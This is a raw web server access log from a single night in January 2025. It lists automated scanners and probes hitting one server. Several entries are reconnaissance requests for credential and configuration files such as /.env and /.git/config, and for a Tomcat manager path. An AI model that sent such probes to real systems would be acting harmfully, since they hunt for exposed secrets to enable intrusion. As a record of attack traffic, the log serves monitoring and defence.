172.202.246.146 - - [09/Jan/2025:00:18:07 +0000] "GET /portal/redlion HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
167.94.138.51 - - [09/Jan/2025:00:30:27 +0000] "\x16\x03\x01" 400 526 "-" "-"
167.94.138.51 - - [09/Jan/2025:00:30:35 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.51 - - [09/Jan/2025:00:30:39 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.51 - - [09/Jan/2025:00:30:41 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.51 - - [09/Jan/2025:00:30:43 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
210.141.211.104 - - [09/Jan/2025:00:32:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [09/Jan/2025:00:43:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
205.210.31.235 - - [09/Jan/2025:01:00:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
40.118.211.231 - - [09/Jan/2025:01:09:55 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.149 - - [09/Jan/2025:01:18:00 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [09/Jan/2025:01:18:00 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [09/Jan/2025:01:33:53 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [09/Jan/2025:01:36:17 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:01:36:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [09/Jan/2025:01:47:52 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
172.105.128.11 - - [09/Jan/2025:01:48:03 +0000] "\x16\x03\x01" 400 526 "-" "-"
172.206.150.13 - - [09/Jan/2025:02:30:29 +0000] "GET /manager/text/list HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
87.121.79.3 - - [09/Jan/2025:02:48:50 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
159.223.67.34 - - [09/Jan/2025:02:52:54 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.67.34 - - [09/Jan/2025:02:53:01 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
179.43.191.146 - - [09/Jan/2025:02:57:24 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.191.146 - - [09/Jan/2025:03:10:51 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [09/Jan/2025:03:13:20 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [09/Jan/2025:03:22:00 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:03:22:00 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
157.230.223.13 - - [09/Jan/2025:03:29:57 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.8.19"
157.230.223.13 - - [09/Jan/2025:03:46:44 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
35.202.9.133 - - [09/Jan/2025:04:18:53 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io)"
195.3.223.55 - - [09/Jan/2025:04:27:31 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [09/Jan/2025:04:52:39 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
95.214.53.198 - - [09/Jan/2025:04:54:46 +0000] "GET / HTTP/1.1" 200 1761 "-" "-"
205.210.31.29 - - [09/Jan/2025:05:00:06 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
5.89.115.21 - - [09/Jan/2025:05:00:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
78.153.140.93 - - [09/Jan/2025:05:04:58 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:05:04:58 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.200.78.250 - - [09/Jan/2025:05:06:06 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.223.3.201 - - [09/Jan/2025:05:40:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
148.153.56.82 - - [09/Jan/2025:05:40:31 +0000] "GET /hkS6 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:31 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/hkS6" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [09/Jan/2025:05:40:32 +0000] "GET /mZc3 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
